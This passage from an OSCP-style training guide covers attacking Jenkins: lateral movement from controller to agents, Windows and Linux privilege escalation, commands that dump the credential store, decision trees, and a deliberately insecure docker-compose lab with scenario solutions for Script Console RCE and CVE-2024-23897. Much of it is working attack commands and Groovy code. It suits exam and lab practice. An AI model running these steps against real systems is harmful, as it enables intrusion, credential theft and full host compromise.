branch** — specifically, immediately check whether the version is in range for
CVE-2024-23897 (file read, low bar) and, if old, CVE-2018-1000861 (pre-auth RCE). But keep
the discipline: validate the range and preconditions, read the PoC, prove the primitive on a
benign target (a file read of `/etc/passwd`) before building the full chain. *OSCP relevance:*
high — both the discipline and the specific CVEs are exam-relevant; CVE-2024-23897 in
particular is a defining modern-Jenkins technique.

---

# PART XIV — Agents, Nodes & Lateral Movement

Jenkins is rarely one machine. The **controller** dispatches builds to **agents** (worker
nodes), and this architecture is a lateral-movement map: compromising the controller lets
you run code on every agent, and compromising an agent can sometimes reach back to the
controller. On the OSCP this shows up as "the shell I got from a build isn't on the same
machine as the web UI" or "the controller holds the key to three other hosts."

## 14.1 Concept — controller and agents

*Concept:* an **agent** is a machine that runs builds on the controller's behalf, connecting
via **inbound (JNLP) on port 50000**, **outbound SSH** (the controller SSHes to the agent),
or other launch methods. The controller has full authority over its agents — it literally
sends them code to run. *Why it matters:* the trust flows controller→agent (the controller
can run anything on any agent), so controller compromise = code exec on all agents; and the
network of agents is often the "internal" hosts you need to reach.

## 14.2 Enumeration — mapping the nodes

```text
/computer/api/json?pretty=true      # list of nodes: names, online/offline, executors, labels
/computer/(built-in)/               # the controller's own executor
/computer/<agent>/                  # each agent
# From the Script Console:
Jenkins.instance.nodes.each { n -> println "${n.nodeName} : ${n.toComputer()?.hostName} : online=${n.toComputer()?.isOnline()}" }
# node config (how the controller reaches the agent — may hold SSH creds refs):
JENKINS_HOME/nodes/<agent>/config.xml
```

*Interpretation:* each agent is another host on the network. Its `config.xml` and the
credentials store reveal *how* the controller authenticates to it (SSH key/user) — which you
can reuse to reach the agent directly.

## 14.3 Controller → agent: run code on any agent

With controller RCE (Script Console/job), you target a specific agent by **assigning a build
to it** (label/node restriction) or by executing a Groovy remoting call that runs on the
agent's channel:

```groovy
// Run a command ON a specific agent from the controller's Script Console:
import hudson.util.RemotingDiagnostics
String agent = "build-agent-01"
def channel = Jenkins.instance.getComputer(agent).getChannel()
println RemotingDiagnostics.executeGroovy('println "id".execute().text', channel)
```

Or simpler: create a job pinned to that agent's label with a shell step (Part IX.5) — the
build runs on the agent, giving you a shell *there*. *This is the primary lateral-movement
technique:* the controller is your jump box to every agent.

## 14.4 Agent → controller

If your foothold landed on an *agent* (a build pinned there), you're not yet on the
controller. The agent trusts the controller, not vice-versa, but options exist: the agent's
filesystem may hold cached secrets, a `secret-file`/JNLP secret, or workspace data with
creds; and if you can influence what the controller runs (poison a shared workspace, a build
script in SCM), you can execute on the controller at the next build. Generally, though,
controller→agent is the easy direction; agent→controller is opportunistic (harvest what's on
the agent and look for controller creds).

## 14.5 The JNLP/50000 surface

Port 50000 is where inbound agents connect using a **secret**. If you can obtain an agent's
JNLP secret (from the controller, or a leaked `jenkins-agent.jnlp`), you could connect a
rogue agent — niche on OSCP. More practically, 50000 is a *recognition* signal and a reminder
that the agent trust model exists. *OSCP relevance:* the port itself is mostly recognition;
the lateral movement value is in the controller→agent execution (14.3).

## 14.6 Relevance

*OSCP relevance:* medium-high on multi-host Jenkins setups. The key mental model: **the
controller is a hub with pre-established trust to other machines** (agents, plus everything
in the credential store). Once you own the controller, enumerate nodes and the store, then
use the controller's own authority and creds to fan out. A build shell landing on an agent
tells you the network is bigger than one box.

---

# PART XV — Windows Jenkins

As with XAMPP, the Windows case has one dominant fact:

> **Jenkins on Windows is frequently installed as a service running as `LocalSystem`.** So
> RCE via the Script Console or a build step often lands you as **`NT AUTHORITY\SYSTEM`
> immediately**, no privilege escalation required.

`whoami` is the first command after any Windows RCE. If it says `nt authority\system`, go
collect proof. If it's a limited service account, the escalation material below applies.

## 15.1 Installation paths and service model

```text
JENKINS_HOME (service):  C:\ProgramData\Jenkins\.jenkins\
JENKINS_HOME (user/war): C:\Users\<user>\.jenkins\
Jenkins install:         C:\Program Files\Jenkins\   (jenkins.exe, jenkins.xml)
Service:                 "Jenkins"  (check its account)
```

```text
C:\> sc qc Jenkins
   SERVICE_START_NAME : LocalSystem            ← RCE = SYSTEM
   BINARY_PATH_NAME   : "C:\Program Files\Jenkins\jenkins.exe"
C:\> whoami /priv                              ← if a service user: SeImpersonatePrivilege?
```

## 15.2 Execution context and what it means

Because build steps and the Script Console run as the Jenkins service account, your RCE
inherits it. LocalSystem → you're done. A dedicated service account → check
`SeImpersonatePrivilege` (common for service accounts) → Potato-family → SYSTEM (15.4).

## 15.3 Windows-specific loot

```text
C:\> type C:\ProgramData\Jenkins\.jenkins\secrets\master.key
C:\> type C:\ProgramData\Jenkins\.jenkins\credentials.xml
C:\> type C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword
C:\> findstr /si password C:\ProgramData\Jenkins\.jenkins\jobs\*\config.xml
C:\> dir C:\ProgramData\Jenkins\.jenkins\jobs\*\builds\*\log   # build logs → leaked secrets
C:\> cmdkey /list                                              # saved creds
```

Decrypt the store with the Script Console's Groovy (Part X.4) — same on Windows.

## 15.4 Privilege escalation once limited

If RCE landed you as a limited account:

1. **`whoami /priv`** → `SeImpersonatePrivilege` → **PrintSpoofer/GodPotato** → SYSTEM. The
   common Jenkins-Windows escalation when not already SYSTEM.
2. **Credential reuse** — decrypted store creds / saved creds tried as local admin / for
   RDP/WinRM.
3. **Writable service binary** — `icacls "C:\Program Files\Jenkins\jenkins.exe"`; if writable,
   replace + restart → the service account.
4. **winPEAS** for unquoted paths, AlwaysInstallElevated, autoruns.

*Stabilise first* (Part XVII): trade the Groovy/build RCE for a real reverse shell
(`msfvenom windows/x64/shell_reverse_tcp`, transfer via `certutil`/PowerShell) before
grinding privesc.

## 15.5 How the methodology shifts on a Windows foothold

Stop thinking HTTP, start thinking host: who am I (`whoami /all`), am I already SYSTEM, what
runs privileged (`sc query`, `schtasks`), what creds are here (JENKINS_HOME store, `cmdkey`),
shortest path to SYSTEM. On Jenkins-Windows the answer is disproportionately "already SYSTEM"
or "SeImpersonate → Potato." Check those two before winPEAS. *OSCP relevance:* high — the
free-SYSTEM outcome makes Windows Jenkins a fast full compromise.

---

# PART XVI — Linux Jenkins

On Linux, Jenkins runs as the unprivileged **`jenkins`** user, so — unlike Windows — you
almost always *do* need to escalate after RCE. The `jenkins` user is nonetheless a useful
foothold: it owns JENKINS_HOME (all secrets) and often has sudo rights, group memberships,
or reachable credentials that lead to root.

## 16.1 Installation paths and execution context

```text
JENKINS_HOME (deb/rpm):  /var/lib/jenkins/
JENKINS_HOME (war):      ~/.jenkins/  (home of the running user)
JENKINS_HOME (docker):   /var/jenkins_home/
Runs as user:            jenkins   (deb/rpm)   — check with: id / ps aux | grep jenkins
Service:                 systemctl status jenkins   (unit: /usr/lib/systemd/system/jenkins.service)
```

```text
$ id
uid=112(jenkins) gid=116(jenkins) groups=116(jenkins),...   # what groups? docker? sudo?
$ ps aux | grep -E 'jenkins|java'
```

## 16.2 Linux loot

```text
$ cat /var/lib/jenkins/secrets/master.key /var/lib/jenkins/secrets/hudson.util.Secret
$ cat /var/lib/jenkins/credentials.xml
$ cat /var/lib/jenkins/secrets/initialAdminPassword
$ grep -Rli 'password\|token\|BEGIN OPENSSH' /var/lib/jenkins/jobs 2>/dev/null   # configs+logs
$ cat /var/lib/jenkins/users/*/config.xml         # bcrypt hashes to crack
$ ls -la /var/lib/jenkins/.ssh 2>/dev/null; cat ~/.ssh/* 2>/dev/null
```

Decrypt the store via the Script Console (Part X.4) or offline (X.3).

## 16.3 The jenkins → root escalation landscape

Check these, roughly in order of frequency on Jenkins boxes:

- **`sudo -l`** — the `jenkins` user with a sudo entry (even a narrow one) is a common,
  clean path. A `NOPASSWD` sudo to any exploitable binary (GTFOBins) → root.
- **Reused/decrypted credentials** — an SSH key or password from the Jenkins store that
  belongs to a *more privileged* user (root, an admin) → `su`/`ssh` → root. Very common: the
  store literally exists to hold powerful creds. (Pattern B.)
- **`docker` group** — if `jenkins` is in the `docker` group (common on CI hosts that build
  images!), that's a trivial root: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.
  Check `id` for `docker` first — it's a frequent Jenkins-host privesc.
- **SUID / capabilities / writable cron** — the standard checks; a root cron touching a
  jenkins-writable path is a classic.
- **Kernel/service exploits** — last resort.

```text
$ sudo -l
$ id | grep -o 'docker'        # docker group → instant root
$ find / -perm -4000 -type f 2>/dev/null
$ cat /etc/crontab; ls -la /etc/cron.*
$ ./linpeas.sh | tee linpeas.out
```

## 16.4 Relevance

*OSCP relevance:* high. The two highest-yield Jenkins-Linux escalations are (1) **the
`docker` group** (CI hosts build containers, so `jenkins` is often in it) and (2) **credential
reuse from the decrypted store** (an SSH key/password for root or an admin). Check `id` for
`docker` and `sudo -l` immediately, and always decrypt and reuse the credential store —
those three moves cover most Jenkins-Linux boxes.

---

# PART XVII — Post-Exploitation

You have code execution (Script Console, a build shell, or a reverse shell). Before privesc,
situate yourself and — the Jenkins-specific priority — **loot the credential store**, because
on Jenkins the secrets are usually worth more than the single host.

## 17.1 Stabilise first

*Linux:* upgrade a build/Groovy shell to a proper TTY —

```text
python3 -c 'import pty;pty.spawn("/bin/bash")'; # Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```

*Windows:* trade the Groovy/build RCE for a reverse shell (`msfvenom`, `certutil` transfer).
Stabilise, then enumerate.

## 17.2 Universal orientation questions

1. **Who am I?** `id`/`whoami` — on Windows, am I SYSTEM already?
2. **Where is JENKINS_HOME, and can I read the store?** (You can — you're the jenkins user.)
3. **What's in the credential store?** decrypt it *now* (Part X.4) — highest-value action.
4. **What creds/keys are on disk?** build logs, job configs, `~/.ssh`, `cmdkey`.
5. **What groups/privileges do I have?** `docker`/sudo (Linux), SeImpersonate (Windows).
6. **What other hosts does this box trust?** agents, and every host in the credential store.
7. **What runs as root/SYSTEM?** services, crons, scheduled tasks.
8. **What's writable that something privileged uses?**

## 17.3 Linux post-exploitation checklist

```text
id; sudo -l; groups | tr ' ' '\n' | grep -E 'docker|lxd|adm|sudo'
ps aux | grep -E 'java|jenkins'
# LOOT THE STORE (do this early)
cat /var/lib/jenkins/secrets/master.key /var/lib/jenkins/secrets/hudson.util.Secret
cat /var/lib/jenkins/credentials.xml
grep -Rli 'password\|token\|BEGIN OPENSSH\|https://[^ ]*@' /var/lib/jenkins/jobs 2>/dev/null
cat /var/lib/jenkins/users/*/config.xml
# privesc surface
find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.d
# network / agents
ss -tulpn; ip a; cat /var/lib/jenkins/nodes/*/config.xml 2>/dev/null
```

## 17.4 Windows post-exploitation checklist

```text
whoami            # SYSTEM? → proof
whoami /all       # SeImpersonate?
sc qc Jenkins     # service account
# LOOT THE STORE
type C:\ProgramData\Jenkins\.jenkins\secrets\master.key
type C:\ProgramData\Jenkins\.jenkins\credentials.xml
findstr /si "password token" C:\ProgramData\Jenkins\.jenkins\jobs\*\config.xml
dir /s C:\ProgramData\Jenkins\.jenkins\jobs\*\builds\*\log
cmdkey /list; reg query HKLM /f password /t REG_SZ /s
# privesc surface
whoami /priv; accesschk.exe -uwcqv "Users" *; schtasks /query /fo LIST /v
icacls "C:\Program Files\Jenkins\jenkins.exe"
net user; net localgroup administrators; ipconfig /all; netstat -ano
```

## 17.5 Recording findings

Log the machine IP, how you got RCE, the decrypted store contents (every credential + what it
opens), the Jenkins user/context, agents, and privesc leads. On Jenkins especially, an early
credential from the store is frequently the privesc *and* the lateral move — record it the
moment you decrypt it.

---

# PART XVIII — Privilege Escalation Through Jenkins

Jenkins RCE gives you the Jenkins user; this Part is the *relationship between that and full
host/root compromise*. As with the XAMPP course, it reduces to two master patterns — but
Jenkins tilts hard toward Pattern B, because the credential store is a purpose-built pile of
powerful secrets.

## 18.1 The two master patterns

```text
Pattern A — writable → privileged-process bridge
    Jenkins user (jenkins / service acct)
        ↓ can write / influence...
    a privileged process (root cron, service binary, docker socket, SeImpersonate→Potato)
        ↓
    root / SYSTEM

Pattern B — credential-reuse bridge  (the dominant one on Jenkins)
    Decrypted credential store + build-log/config secrets
        ↓ reused as...
    OS credentials (root SSH key, admin password) OR access to other hosts
        ↓ ssh / su / runas / WinRM
    root / SYSTEM / lateral compromise
```

## 18.2 Pattern A vectors

- **Windows: already SYSTEM** (service as LocalSystem) — the "escalation" is free.
- **Windows: SeImpersonate → Potato** when Jenkins runs as a limited service account.
- **Linux: `docker` group** — `jenkins` in `docker` = root via a mounted-host container.
  (The most common Jenkins-Linux Pattern-A win.)
- **Linux: `sudo -l`** — a NOPASSWD sudo entry → GTFOBins → root.
- **Writable service binary / unit / cron** — replace what root runs.

## 18.3 Pattern B vectors (the Jenkins specialty)

- **Decrypted store → root SSH key/password.** The store often holds a key or password for a
  privileged account on the same or another host. `ssh root@localhost -i recovered_key` →
  root. This is *the* canonical Jenkins privesc.
- **Build-log/config plaintext secrets** → reused for `su`/RDP/WinRM.
- **Cracked user hash** (`users/*/config.xml`) → the admin's reused OS password.
- **Git/deploy tokens** → other repos/hosts (lateral, more secrets).

## 18.4 The reasoning discipline

Two questions at every privesc fork: **(A)** *What runs as root/SYSTEM here, and can I
influence what it runs?* (writable service/cron, docker socket, SeImpersonate). **(B)** *What
secrets have I recovered, and where haven't I tried them?* — and on Jenkins, **always decrypt
the credential store first**, because it is the richest source of Pattern-B material you will
find on almost any target. Exploit names (PrintSpoofer, GodPotato, a docker-group one-liner,
GTFOBins) are just the tools that execute the insight. On Jenkins, the insight is usually
"the store held a credential more powerful than the jenkins user." *OSCP relevance:* very
high — decrypt-and-reuse is the second half of most Jenkins boxes, and the `docker`-group and
already-SYSTEM cases are frequent instant wins.

---

# PART XIX — Tool-Assisted Methodology

Each tool answers a question. Framed that way — with the false positives that waste time —
here is the Jenkins toolkit. Anti-goal: "run these commands." Goal: know which tool for the
question in front of you.

**Nmap** — *Q: is Jenkins here and what version?* Start; `-p-` once. Output that matters:
8080/8443/50000 open, Jetty banner, `[Jenkins]` title, and the `X-Jenkins` version via
`http-headers`. False positives: a proxy may hide 8080 (check 80/443 context paths).
Action: confirm Jenkins, grab version, probe `/script` and `/cli`.

**curl** — *Q: what exactly does this endpoint return for my identity?* The primary Jenkins
tool: headers (`-I` → `X-Jenkins`), `/whoAmI/api/json`, `/api/json`, reading job configs and
build logs, fetching a crumb, POSTing to `createItem`/`scriptText`/`build`. False positives:
none — ground truth. Action: essentially all enumeration and API-driven exploitation.

**A browser (+ Burp)** — *Q: what can I see/do in the UI, and can I modify requests?* For
the Script Console, job creation UI, signup, and intercepting/replaying. False positives:
n/a. Action: manual Script Console RCE, job build steps, exploring what your identity can
reach.

**jenkins-cli.jar** — *Q: what does the CLI expose, and is CVE-2024-23897 present?* Grab from
`/jnlpJars/jenkins-cli.jar`. `help` (anon command list), `who-am-i`, the `@file` read test,
and `groovy =` for authed RCE. False positives: a command that doesn't echo its arg won't
demonstrate the file-read — use a known-good one. Action: file-read chain (Part VI), authed
Groovy RCE.

**gobuster/ffuf** — *Q: what endpoints/paths exist?* Less central than on a generic web app
(Jenkins' routes are known), but useful to find a context path, a proxied Jenkins, or an
exposed backup of JENKINS_HOME. False positives: Jenkins returns 200/403 patterns that can
soft-match; filter by size. Action: locate the base URL; find stray backups.

**searchsploit / exploit-db / Metasploit** — *Q: is there a public exploit for this
core/plugin version?* After you have a precise version and applied the six-question filter.
MSF has modules for the marquee CVEs (2018-1000861, Script Security bypasses) and a Script
Console exploit. False positives: a module for the wrong LTS line silently fails. Action:
`-x` to read first; validate the range; prefer manual for the Script Console/job paths.

**A Jenkins-credential-decryptor** (`jenkins_decrypt.py` / `jenkins-credential-decryptor`) —
*Q: what are the plaintext stored secrets?* When you have `master.key`+`hudson.util.Secret`+
`credentials.xml` (offline). False positives: truncated/partial key files → garbage; ensure
exact bytes. Action: recover creds → reuse. (With RCE, prefer the online Groovy decrypt —
Part X.4.)

**Netcat** — *Q: catch a shell / raw poke.* `nc -lvnp 443` for the reverse shell from a
Groovy/build payload; banner-grab 50000. Action: foothold capture → stabilise.

**Linux/Windows enum tools** (linpeas/winPEAS, pspy) — *Q: privesc surface?* Post-shell.
False positives: both over-report — verify. On Jenkins specifically, check `id` for `docker`,
`sudo -l` (Linux), and `whoami`/`whoami /priv` (Windows) *by hand first* — the Jenkins wins
are usually one of those, not buried in peas output. Action: verify and exploit.

### The tool doctrine

Same as always: tools accelerate a methodology you hold in your head. A scanner/PoC result
is a hypothesis you confirm with `curl`/the UI/a benign probe before building on it. On
Jenkins the highest-leverage "tools" are just `curl` (drives the API/CLI exploits) and the
Script Console (RCE + credential decrypt) — most of the rest is confirmation and privesc.

---

# PART XX — Decision Trees

Tactical "I'm at a fork, what now?" lookups, complementing the Part III master tree.

## 20.1 "Jenkins discovered" tree

```text
Jenkins discovered
   │
   ├─ /script reachable (anon or after trivial login)?
   │     ├─ Yes → Groovy RCE (Part VIII) → loot store → privesc
   │     └─ No  → continue
   ├─ Version in range for a pre-auth/low-auth CVE?
   │     ├─ CVE-2024-23897 (≤2.426.2/2.441) → CLI file-read → decrypt store → admin/SSH
   │     ├─ CVE-2018-1000861 (≤2.138.3/2.153) → pre-auth RCE
   │     └─ else → continue
   ├─ Can I get an identity? (open signup / weak-reused-leaked creds / token)
   │     ├─ Yes → check /whoAmI + what UI appears
   │     │          ├─ Overall/RunScripts or Administer → Script Console RCE
   │     │          ├─ Job create/configure+build → job RCE (Part IX)
   │     │          └─ Overall/Read only → harvest info, find another path
   │     └─ No  → anonymous read? → mine job configs + build logs for creds → loop back
   └─ Plugin at a vulnerable version? → plugin CVE (Part XII/XIII)
```

## 20.2 "I have an identity, what can it do" tree

```text
Logged in (or anonymous with rights)
   │
   ├─ /script loads? ───────────────► Script Console RCE
   ├─ "New Item" / createItem works? ► job with shell/bat step → build → RCE
   ├─ Configure on an existing job? ─► hijack its build step → RCE
   ├─ Can submit a pipeline? ────────► node{ sh '...' } (sh bypasses sandbox) → RCE
   ├─ Credentials/view? ─────────────► exfiltrate secrets → reuse
   └─ Only Overall/Read? ────────────► read all job configs + build logs → creds → escalate identity
```

## 20.3 "I have RCE, now what" tree

```text
Code execution as Jenkins user
   │
   ├─ whoami/id → Windows SYSTEM? → collect proof
   ├─ DECRYPT THE CREDENTIAL STORE (Part X.4)  ← do this first, always
   │        → SSH keys/passwords/tokens → reuse: host privesc + lateral + more repos
   ├─ Linux: id has 'docker'? → docker-socket root.  sudo -l? → GTFOBins root.
   ├─ Windows: SeImpersonate? → Potato → SYSTEM.  Writable jenkins.exe? → replace+restart.
   ├─ Enumerate agents (/computer, nodes/*/config.xml) → run code on them (lateral)
   └─ Nothing obvious → linpeas/winpeas → verify → kernel/local exploit last
```

## 20.4 "Locked-down Jenkins" tree (anonymous sees nothing)

```text
Anonymous 403s everything, UI needs login
   │
   ├─ Version ≤2.426.2/2.441? → CVE-2024-23897 CLI file-read (works with anon/read!)
   │        → read secrets/* + credentials.xml + initialAdminPassword → decrypt/login
   ├─ Open signup? → register → re-check authorization
   ├─ Weak/reused/leaked creds or token from elsewhere? → login → check rights
   └─ Old version? → CVE-2018-1000861 pre-auth RCE
```

These trees are deliberately shallow — the "which magnifying glass" decisions. Memorise their
*shape*, not the commands.

---

# PART XXI — OSCP Exam Time Management

Jenkins is unusually prone to a *fast* win (open `/script`, a pre-auth CVE, decrypt-and-reuse)
and to two time-sinks: brute-forcing a hardened login, and CVE-shotgunning plugin versions.
The time-boxed method front-loads the instant wins and the credential-store loot.

## 21.1 The 5-minute Jenkins triage

```text
0–1 : nmap has 8080/50000? grab X-Jenkins VERSION. confirm Jenkins.
1–2 : curl /script  (anon RCE?!) ; curl /whoAmI/api/json (my rights) ; /login footer version
2–3 : version ≤2.426.2/2.441 → note CVE-2024-23897 (CLI file read). ≤2.138.3 → note pre-auth RCE.
3–4 : /signup open? try admin:admin / admin:password / leaked creds. /asynchPeople (user list).
4–5 : if anonymous read → skim job configs + a couple of build logs for creds. write to-do list.
```

If `/script` is open, or the version hands you 2024-23897, you may already be done in these
5 minutes.

## 21.2 The 15-minute Jenkins enumeration

```text
- Get an identity (signup / weak-reused creds / leaked token) and re-check /whoAmI + /script.
- If any RCE-equivalent right → execute (Script Console or job).
- If in-range CVE → run the validated file-read/RCE.
- Read every readable job config + build log → harvest creds/tokens (reuse at the login).
- Enumerate plugin versions if core looks patched.
- Rank leads: instant-RCE > file-read-CVE > job-rights > cred-harvest > plugin-CVE > brute.
```

## 21.3 The 30-minute deep investigation

```text
- Commit to the top lead and drive it to RCE (Script Console / job / CVE chain).
- Time-box a single vector ~20–30 min. Stalls → pivot to the next ranked lead.
- Hard-stop trigger: 30 min on one exploit with no progress → an unread build log / untried
  leaked credential / the CLI file-read almost always outranks continuing.
- Once RCE: DECRYPT THE STORE immediately, then privesc (docker/sudo/SeImpersonate/reuse).
```

## 21.4 Depth vs deprioritise

**Deserves depth:** an open/reachable Script Console; an in-range CVE-2024-23897 or
2018-1000861; job-creation rights; a decrypted store you haven't finished reusing; anonymous-
readable build logs. **Deprioritise:** brute-forcing a hardened login (a short list only,
then stop); plugin-CVE shotgunning without a version match; building a fragile PoC when the
store or a build log already leaks creds.

## 21.5 Pivot / return / rabbit-hole avoidance

- **Pivot** on the time-box; prefer the CLI file-read or an unread build log over a stuck
  exploit.
- **Return** to a hardened login once a build log/store hands you its password.
- **Breadth checkpoint** before any 30-min commit: checked `/script`? checked the version for
  2024-23897? tried signup + leaked creds? read the build logs? If not, you're tunnelling.
- **Name the Jenkins traps:** "am I brute-forcing a login when the version has a pre-auth
  file-read?" and "did I decrypt the store, or am I doing privesc the hard way?"

## 21.6 Recording (exam hygiene)

Per-machine note: IP, version, base URL, anonymous access, `/whoAmI` rights, every credential
(from logs/store) + what it opens, the RCE method, agents, privesc path. Screenshot proofs
(`hostname`+`whoami`/`id`+flag). On Jenkins the decrypted store is often *both* the local
privesc and the lateral move — record each secret and where it worked.

*One-paragraph summary:* grab the version and check `/script` in the first 5 minutes; if no
instant win, get an identity and find the RCE-equivalent right or the in-range CVE; the moment
you have RCE, decrypt the credential store and reuse it for privesc and lateral movement;
time-box every single vector and prefer a leaked/decrypted credential over any stuck exploit.

---

# PART XXII — Build a Dedicated Jenkins Attack Lab

Twelve scenarios, each a mini penetration test. **Docker** is the fast path (the official
`jenkins/jenkins` image makes most scenarios trivial to stand up and reset); **VMs** are
required for the OS-privesc finales (10/11) and give the real exam feel. Do not read a
scenario's solution before attempting it.

> **Safety:** isolated host-only network only. These configs are deliberately insecure.
> Snapshot VMs / use `docker compose down -v` to reset.

## 22.0 Lab infrastructure — the two build paths

### Docker path (scenarios 1–9, 12's controller portion)

```yaml
# docker-compose.base.yml — a controller + one agent + a target host to reach
version: "3.8"
services:
  jenkins:
    image: jenkins/jenkins:2.426.1-lts        # pin a version per scenario (vulnerable ones below)
    container_name: jenkins
    ports: ["8080:8080", "50000:50000"]
    environment:
      # Scenario toggles (uncomment per scenario):
      # JAVA_OPTS: "-Djenkins.install.runSetupWizard=false"   # skip setup → "anyone can do anything"-ish
      JENKINS_OPTS: ""
    volumes:
      - jenkins_home:/var/jenkins_home          # JENKINS_HOME (credentials.xml, secrets/*, jobs/*)
      - ./casc:/var/jenkins_home/casc_configs    # Configuration-as-Code to preset auth/creds/jobs
    networks: [labnet]
  agent:
    image: jenkins/ssh-agent:latest             # an SSH build agent (scenario 9 lateral)
    container_name: jenkins-agent
    networks: [labnet]
  target:
    image: alpine:latest                        # a "third host" for lateral movement / reuse
    command: ["sh","-c","apk add --no-cache openssh && ssh-keygen -A && adduser -D deploy && echo 'deploy:Autumn2026!' | chpasswd && /usr/sbin/sshd -D"]
    networks: [labnet]
volumes: { jenkins_home: {} }
networks: { labnet: { driver: bridge } }
```

Two ways to preset a scenario's state:

1. **Configuration-as-Code (JCasC)** — drop a YAML in `./casc` and set
   `CASC_JENKINS_CONFIG=/var/jenkins_home/casc_configs`. Lets you declare the security realm,
   authorization strategy, users, credentials, and jobs deterministically. Example
   (open-signup + logged-in-can-do-anything, plus a stored secret):

```yaml
# casc/scenario2.yaml
jenkins:
  securityRealm:
    local:
      allowsSignup: true                        # OPEN SIGNUP (scenario 2)
      users:
        - id: admin
          password: "admin"                     # weak admin (scenario 4)
  authorizationStrategy:
    loggedInUsersCanDoAnything:                 # any authenticated user = admin (scenario 2)
      allowAnonymousRead: true                  # anonymous read (scenarios 1/8)
credentials:
  system:
    domainCredentials:
      - credentials:
          - usernamePassword:
              scope: GLOBAL
              id: deploy-creds
              username: deploy
              password: "Autumn2026!"           # reused on the 'target' host (scenario 5)
          - basicSSHUserPrivateKey:
              scope: GLOBAL
              id: agent-key
              username: root
              privateKeySource:
                directEntry:
                  privateKey: "${AGENT_SSH_KEY}"   # JCasC interpolates the key from a secret
```

2. **Manual first-run** — start without disabling the wizard, use `initialAdminPassword`, and
   configure each scenario's auth/jobs by hand (closer to how a real box drifts into misconfig).

Reset between scenarios: `docker compose down -v && docker compose up -d`.

### VM path (all scenarios; required for 10 & 11)

- **Linux Jenkins VM:** Debian/Ubuntu, install Jenkins from the official apt repo (runs as
  `jenkins`, JENKINS_HOME `/var/lib/jenkins`). For scenario 11, reproduce the two canonical
  escalations: add `jenkins` to the `docker` group (and install Docker), *or* give `jenkins`
  a `NOPASSWD` sudo entry to an exploitable binary. Snapshot clean.
- **Windows Jenkins VM:** install the Windows Jenkins MSI; for scenario 10 run the service as
  LocalSystem (default) for the free-SYSTEM case, or as a limited service account with
  `SeImpersonatePrivilege` to practise Potato. Snapshot clean.
- **Network:** host-only; attack from Kali on the same net; you get an IP and nothing else.

Do the foothold scenarios (1–9,12) in Docker for speed; repeat 1/3/5/9/12 and do 10/11 in the
VMs for the OS half (stabilisation, store decryption on disk, privesc).

---

Each scenario: **do not read past "Questions to answer" before attempting.**

## 22.1 Lab 1 — Default / anonymous-read Jenkins (recognition + free read)

- **Objective:** confirm Jenkins, enumerate what anonymous can see, harvest info without an
  account.
- **Starting info:** an IP. **Setup:** base image, JCasC with `allowAnonymousRead: true`, one
  job with a build log that echoes a `git clone https://deploy:Autumn2026!@repo` line.
- **Enumeration tasks:** version, ports, `/whoAmI`, user list, readable job configs + build
  logs.
- **Questions:** Exact version? Where's JENKINS_HOME (infer)? Does anonymous read work? What
  did a build log leak?
- **Expected discoveries:** `X-Jenkins` version; anonymous dashboard; a build log leaking a
  credential.
- **Hints:** (1) The version is in a header. (2) `/asynchPeople/` lists users. (3) Read the
  *console output* of every job's recent builds.
- **Full solution:** `curl -sI :8080` → `X-Jenkins: 2.426.1`. Dashboard loads anon → read
  `job/build/1/consoleText` → `deploy:Autumn2026!`. No exploitation yet — you now have a
  credential and the lay of the land.
- **Alt paths:** the same cred appears in the credential store (later scenarios).
- **Lessons:** Jenkins announces its version; anonymous read + talkative build logs = free
  credentials.

## 22.2 Lab 2 — Open signup + loose authorization → Script Console

- **Objective:** register an account and turn loose authorization into RCE.
- **Setup:** JCasC `allowsSignup: true` + `loggedInUsersCanDoAnything`.
- **Tasks:** find signup, register, re-check `/whoAmI` and `/script`, execute.
- **Questions:** Is signup open? After registering, what can you do? Does `/script` load?
- **Expected discoveries:** register → authenticated → Script Console → RCE.
- **Hints:** (1) The login page offers something. (2) Re-check your permissions *after*
  registering. (3) `/script` is one request from a shell.
- **Full solution:** `/signup` → create `attacker:attacker` → `/whoAmI` now authenticated →
  `/script` loads → `println "id".execute().text` → RCE → reverse shell.
- **Alt paths:** job creation instead of Script Console (both available under this strategy).
- **Lessons:** open signup + "logged-in can do anything" = full RCE; authentication without
  restrictive authorization is no boundary at all.

## 22.3 Lab 3 — Exposed Script Console (anonymous RCE)

- **Objective:** the one-request compromise.
- **Setup:** JCasC granting `anonymous` `Overall/RunScripts` (or "anyone can do anything").
- **Tasks:** check `/script` unauth; execute; decrypt the store from Groovy.
- **Questions:** Is `/script` reachable anonymously? Can you run Groovy? Can you dump
  credentials from the console?
- **Expected discoveries:** anon `/script` → RCE → in-console credential decryption.
- **Hints:** (1) Try `/script` before anything else. (2) Groovy runs OS commands via
  `.execute()`. (3) The console can decrypt Jenkins' own secrets.
- **Full solution:** `curl /script` returns the console anon → `println "id".execute().text`
  → RCE. Then dump creds with the `SystemCredentialsProvider` Groovy (Part X.4). Reverse
  shell for a foothold.
- **Alt paths:** `/scriptText` via curl.
- **Lessons:** an exposed Script Console is total compromise + instant secret theft; it's the
  first thing to check.

## 22.4 Lab 4 — CVE-2024-23897 CLI file read → decrypt → admin

- **Objective:** the modern marquee CVE, end to end.
- **Setup:** pin `jenkins/jenkins:2.426.1-lts` (in range); UI locked down (no anon read, no
  signup); a credential store with an SSH key for a privileged user; `initialAdminPassword`
  present.
- **Tasks:** confirm version in range; use the CLI `@file` read; pull the three decryption
  files (and/or `initialAdminPassword`); decrypt; log in / SSH.
- **Questions:** Is the version vulnerable? Can you read `/etc/passwd` via the CLI? Which files
  decrypt the store? What does the store contain?
- **Expected discoveries:** file-read confirmed → `master.key`+`hudson.util.Secret`+
  `credentials.xml` → decrypt → SSH key / admin password → access.
- **Hints:** (1) Version ≤2.426.2/2.441 → CVE-2024-23897. (2) Prove it on `/etc/passwd`
  first. (3) You need three specific files to decrypt the store offline.
- **Full solution:** grab `jenkins-cli.jar`; `connect-node "@/etc/passwd"` leaks the file via
  error messages → read `secrets/master.key`, `secrets/hudson.util.Secret`,
  `credentials.xml` → `jenkins_decrypt.py` → recover creds/key → SSH in (or read
  `initialAdminPassword` → admin → Script Console).
- **Alt paths:** read `users/admin/config.xml`, crack the bcrypt.
- **Lessons:** the CLI file-read defeats a locked-down UI; it targets the store-decryption
  files specifically; "anonymous sees nothing" ≠ "anonymous can't read files."

## 22.5 Lab 5 — Credential store theft → lateral movement

